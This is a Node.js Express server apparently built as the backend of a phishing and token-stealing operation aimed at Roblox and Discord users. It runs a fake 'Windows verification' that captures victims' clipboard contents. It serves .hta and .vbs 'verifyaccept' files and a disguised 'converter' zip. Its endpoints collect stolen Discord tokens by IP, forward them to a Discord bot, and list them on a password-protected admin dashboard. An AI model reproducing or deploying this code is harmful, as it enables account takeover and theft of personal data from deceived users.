require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Import sendToDiscordBot from your bot.js
const { sendToDiscordBot } = require('./bot');

app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static('public'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

function getRealIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  return req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
         req.ip;
}

// Handle Windows verification
const codeMap = {}; // Stores IP -> code

app.get('/generate-verification-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('GENERATE - IP:', ip);
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  code += "-";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  codeMap[ip] = code;
  res.json({ code });
});

app.post('/verify-windows-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('VERIFY - IP:', ip);

  const { clipboard } = req.body;
  const expectedCode = codeMap[ip];
  if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
  if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
  
  // Set verification cookies
  res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  res.cookie('tokenGateVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  
  res.json({ success: true });
});

// Check verification status endpoint
app.get('/check-verification', (req, res) => {
  const isVerified = req.cookies && 
    (req.cookies.windowsVerified === '1' || req.cookies.tokenGateVerified === '1');
  
  res.json({ verified: isVerified });
});

// Serve verification pages
app.get('/verify', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (userAgent.includes("Windows")) {
    if (req.cookies && req.cookies.windowsVerified === '1') {
      return res.redirect('/');
    } else {
      return res.redirect('/verify-windows');
    }
  } else {
    return res.redirect('/verifynotwindows');
  }
});

// Static routes
app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));

// Serve the HTA file correctly
app.get('/verifyaccept.hta', (req, res) => {
  res.set({
    'Content-Type': 'application/hta',
    'Cache-Control': 'no-cache'
  });
  res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
});

// Get user IP endpoint
app.get('/get-ip', (req, res) => {
  const userIP = getRealIP(req);
  res.json({ ip: userIP });
});

// Handle clipboard submissions
app.post('/submit-clipboard', (req, res) => {
  const { clipboardData, userIP, type } = req.body;
  const realIP = userIP || getRealIP(req);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  const filename = `clipboard_${sanitizedIP}_${timestamp}.html`;
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'clipboard', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const savePath = path.join(ipFolder, filename);
  
  // Also save to main clipboard.html for admin view
  const mainSavePath = path.join(__dirname, 'data', 'clipboard.html');
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  
  const logEntry = `\n<!-- IP: ${realIP} | Type: ${type} | Time: ${new Date().toISOString()} -->\n${clipboardData}\n<hr>\n`;
  
  fs.writeFile(savePath, clipboardData, err => {
    if (err) return res.status(500).send('Failed to save clipboard data.');
    
    // Append to main file
    fs.appendFile(mainSavePath, logEntry, (appendErr) => {
      if (appendErr) console.error('Failed to append to main clipboard file:', appendErr);
    });
    
    // Send to Discord bot (your bot.js handles actual sending)
    sendToDiscordBot({
      clipboardData: clipboardData,
      userIP: realIP,
      type: type || 'game'
    }, 'clipboard');
    
    console.log(`Clipboard saved for IP ${realIP}: ${filename}`);
    res.send('Clipboard saved.');
  });
});

// Handle Discord token submissions (GET endpoint)
app.get('/receive-token', (req, res) => {
  const { token, serverId } = req.query;
  const realIP = getRealIP(req);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>Server ID:</strong> ${serverId}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord bot
  sendToDiscordBot({
    token: token,
    userIP: realIP,
    serverId: serverId
  }, 'token');
  
  // Send a success page
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Token Received</title>
    <style>
      body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
      .success { color: #4CAF50; font-size: 1.5rem; margin-bottom: 20px; }
    </style>
  </head>
  <body>
    <div class="success">✅ Server token received!!</div>
    <p>Check the console for your server token!!</p>
    <p>You can close this tab now.</p>
    <script>setTimeout(() => window.close(), 2000);</script>
  </body>
  </html>`);
});

// Keep POST endpoint for manual submissions
app.post('/receive-token', (req, res) => {
  const { token, userIP, serverId } = req.body;
  const realIP = userIP || getRealIP(req);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>Server ID:</strong> ${serverId}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord bot
  sendToDiscordBot({
    token: token,
    userIP: realIP,
    serverId: serverId
  }, 'token');
  
  res.sendStatus(200);
});

// Admin endpoint
app.get('/admin', (req, res) => {
  const provided = req.query.password;
  const correct = process.env.ADMIN_PASSWORD;
  
  if (provided !== correct) return res.status(403).send('Unauthorized');
  
  const clipboardPath = path.join(__dirname, 'data', 'clipboard.html');
  const tokensPath = path.join(__dirname, 'data', 'tokens.html');
  
  const clipboardContent = fs.existsSync(clipboardPath) 
    ? fs.readFileSync(clipboardPath, 'utf8') 
    : 'No clipboard data yet.';
    
  const tokensContent = fs.existsSync(tokensPath) 
    ? fs.readFileSync(tokensPath, 'utf8') 
    : 'No tokens yet.';
  
  const adminHTML = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>Admin Dashboard</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 20px; background: #111; color: #fff; }
      .section { margin-bottom: 40px; padding: 20px; background: #222; border-radius: 8px; }
      h2 { color: #4CAF50; }
      pre { background: #333; padding: 15px; border-radius: 4px; overflow-x: auto; }
    </style>
  </head>
  <body>
    <h1>Admin Dashboard</h1>
    
    <div class="section">
      <h2>Clipboard Submissions</h2>
      <pre>${clipboardContent}</pre>
    </div>
    
    <div class="section">
      <h2>Discord Tokens</h2>
      <pre>${tokensContent}</pre>
    </div>
  </body>
  </html>`;
  
  res.send(adminHTML);
});

// Additional static routes
app.get('/verifyaccept.vbs', (req, res) => {
  res.set('Content-Type', 'application/x-vbs');
  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
});

app.get('/download', (req, res) => {
  res.download(path.join(__dirname, 'public', 'Rblxdiscordconverter.zip'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  
  // Ensure data directories exist
  const dirs = [
    path.join(__dirname, 'data'),
    path.join(__dirname, 'data', 'clipboard'),
    path.join(__dirname, 'data', 'tokens')
  ];
  
  dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  });
});
